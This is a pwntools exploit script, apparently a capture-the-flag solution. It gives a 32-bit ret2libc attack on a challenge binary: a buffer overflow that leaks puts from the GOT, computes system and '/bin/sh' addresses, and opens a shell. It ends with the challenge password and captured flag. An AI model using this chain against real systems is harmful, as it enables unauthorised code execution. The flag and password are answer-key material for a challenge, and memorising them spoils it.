from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b 
continue
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['wt.exe', 'ubuntu.exe', '-c']
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
# ld = ELF("./ld-2.27.so")

offset = 112

io = start()

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

payload = flat([
    b"A"*offset,
    p32(puts_plt),
    p32(0x8048772),
    p32(puts_got),

])


io.sendlineafter(b'> ', b'nournot401')
io.sendlineafter(b'> ', payload)
leak = u32(io.recvline()[:4],16) - 0x05fcb0
system = leak + 0x03adb0
binsh = leak + 	0x15bb2b 

print(hex(leak))
print(hex(system))
print(hex(binsh))


payload = flat([
    b"A"*offset,
    p32(system),
    p32(0x0804844e),
    p32(binsh),

])

io.sendlineafter(b'> ', payload)

io.interactive()

#BOH25{u_r_n07_7h3r3_bu7_1_571ll_m1551n6_u}